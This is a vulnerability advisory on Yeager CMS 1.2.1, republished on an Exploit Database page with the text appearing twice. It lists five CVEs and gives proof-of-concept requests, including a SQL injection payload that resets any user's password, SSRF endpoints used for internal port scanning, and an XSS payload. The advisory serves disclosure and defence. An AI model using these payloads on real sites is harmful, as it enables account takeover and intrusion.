Vendor description:
-------------------
Yeager is an open source CMS that aims to become the most cost/time-effective
solution for medium and large web sites and applications.

Business recommendation:
------------------------
Yeager CMS suffers from multiple vulnerabilities due to improper input
validation and unprotected test scripts. By exploiting these vulnerabilities
an attacker could:
    1. Change user's passwords including the administrator's account.
    2. Gain full access to the Yeager CMS database.
    3. Determine internal servers that inaccessible from the Internet.
    4. Attack other users of the Yeager CMS with Cross-Site Scripting.

SEC Consult recommends not to use this software until a thorough security
review has been performed by security professionals and all identified
issues have been resolved.

Vulnerability overview/description:
-----------------------------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
2. Post-authentication Blind SQL Injection (CVE-2015-7569)
3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
5. Non-permanent Cross-site Scripting (CVE-2015-7572)

Proof of concept:
-----------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
http://<host>/yeager/?action=passwordreset&token=<SQL Injection>
http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"<SQL
Injection>"}}]

The vulnerability can also be used for unauthorized reset password of any user.
In order to reset a specific user's password, an attacker will need to provide
a valid email address of the user that he wants to attack.
The email can be retrieved by either social engineering or using the
aforementioned unauthenticated SQL injection vulnerability.

http://<host>/yeager/y.php/responder?handler=recoverLogin&us=sess_20000&lh=70&d
ata=["noevent",{"yg_property":"recoverLogin","params":{"userEmail":"<victim@ema
il.com>","winID":"1"}}]

The above URL just simply creates and sends a reset password token to the
user's email. Next, even if attacker does not know the token,
manipulating SQL commands allows to force to set the new password instantly.

Note that new password MUST be at least 8 characters in length
and must contain both letters and numbers.

http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"'+or+ui
d=(select+id+from+yg_user+where+login='<victim@email.com>')+limit+1--+-","userP
assword":"<new-password>","winID":"1"}}]

2. Post-authentication Blind SQL Injection (CVE-2015-7569)
http://<host>/yeager/y.php/tab_USERLIST
POST Data:
win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&
lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=<SQL
Injection>&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1

3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
A publicly known Arbitrary File Upload vulnerability of Plupload was found in
Yeager CMS.
Fortunately, to successfully exploit the vulnerability requires PHP directive
"upload_tmp_dir" set to an existing directory and it must contain the writable
directory "plupload".

By default, the PHP directive "upload_tmp_dir" is an empty value.
As a result, the script will attempt to upload a file to /plupload/ instead
which generally does not exist on the filesystem.

http://<host>/yeager/ui/js/3rd/plupload/examples/upload.php

4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_datadictionary.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite_sessions.php

The parameter "dbhost" can be used to perform internal port scan using
time delay measurement. An attacker can provide internal IP address
and port number, for example, 10.10.0.1:22. The attacker then compares
time delays from multiple responses in order to determine host
and port availability.

5. Non-permanent Cross-site Scripting (CVE-2015-7572)
A previously published XSS vulnerability of Plupload was found in Yeager CMS.
http://<host>/yeager/ui/js/3rd/plupload/js/plupload.flash.swf?id=\%22%29%29;}ca
tch%28e%29{alert%28/XSS/%29;}//

Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been tested on Yeager CMS 1.2.1

URL: http://yeager.cm/en/download/package/?v=1.2.1.0.0

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Vendor description:
- -------------------
Yeager is an open source CMS that aims to become the most cost/time-effective
solution for medium and large web sites and applications.

Business recommendation:
- ------------------------
Yeager CMS suffers from multiple vulnerabilities due to improper input
validation and unprotected test scripts. By exploiting these vulnerabilities
an attacker could:
    1. Change user's passwords including the administrator's account.
    2. Gain full access to the Yeager CMS database.
    3. Determine internal servers that inaccessible from the Internet.
    4. Attack other users of the Yeager CMS with Cross-Site Scripting.

SEC Consult recommends not to use this software until a thorough security
review has been performed by security professionals and all identified
issues have been resolved.

Vulnerability overview/description:
- -----------------------------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
2. Post-authentication Blind SQL Injection (CVE-2015-7569)
3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
5. Non-permanent Cross-site Scripting (CVE-2015-7572)

Proof of concept:
- -----------------
1. Unauthenticated Blind SQL Injection (CVE-2015-7567, CVE-2015-7568)
http://<host>/yeager/?action=passwordreset&token=<SQL Injection>
http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"<SQL
Injection>"}}]

The vulnerability can also be used for unauthorized reset password of any user.
In order to reset a specific user's password, an attacker will need to provide
a valid email address of the user that he wants to attack.
The email can be retrieved by either social engineering or using the
aforementioned unauthenticated SQL injection vulnerability.

http://<host>/yeager/y.php/responder?handler=recoverLogin&us=sess_20000&lh=70&d
ata=["noevent",{"yg_property":"recoverLogin","params":{"userEmail":"<victim@ema
il.com>","winID":"1"}}]

The above URL just simply creates and sends a reset password token to the
user's email. Next, even if attacker does not know the token,
manipulating SQL commands allows to force to set the new password instantly.

Note that new password MUST be at least 8 characters in length
and must contain both letters and numbers.

http://<host>/yeager/y.php/responder?handler=setNewPassword&us=sess_20000&lh=70
&data=["noevent",{"yg_property":"setNewPassword","params":{"userToken":"'+or+ui
d=(select+id+from+yg_user+where+login='<victim () email com>')+limit+1--+-","userP
assword":"<new-password>","winID":"1"}}]

2. Post-authentication Blind SQL Injection (CVE-2015-7569)
http://<host>/yeager/y.php/tab_USERLIST
POST Data:
win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&
lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=<SQL
Injection>&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1

3. Unauthenticated Arbitrary File Upload (CVE-2015-7571)
A publicly known Arbitrary File Upload vulnerability of Plupload was found in
Yeager CMS.
Fortunately, to successfully exploit the vulnerability requires PHP directive
"upload_tmp_dir" set to an existing directory and it must contain the writable
directory "plupload".

By default, the PHP directive "upload_tmp_dir" is an empty value.
As a result, the script will attempt to upload a file to /plupload/ instead
which generally does not exist on the filesystem.

http://<host>/yeager/ui/js/3rd/plupload/examples/upload.php

4. Unauthenticated Server-side Request Forgery (CVE-2015-7570)
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_datadictionary.php
http://<host>/yeager/libs/org/adodb_lite/tests/test_adodb_lite_sessions.php

The parameter "dbhost" can be used to perform internal port scan using
time delay measurement. An attacker can provide internal IP address
and port number, for example, 10.10.0.1:22. The attacker then compares
time delays from multiple responses in order to determine host
and port availability.

5. Non-permanent Cross-site Scripting (CVE-2015-7572)
A previously published XSS vulnerability of Plupload was found in Yeager CMS.
http://<host>/yeager/ui/js/3rd/plupload/js/plupload.flash.swf?id=\%22%29%29;}ca
tch%28e%29{alert%28/XSS/%29;}//
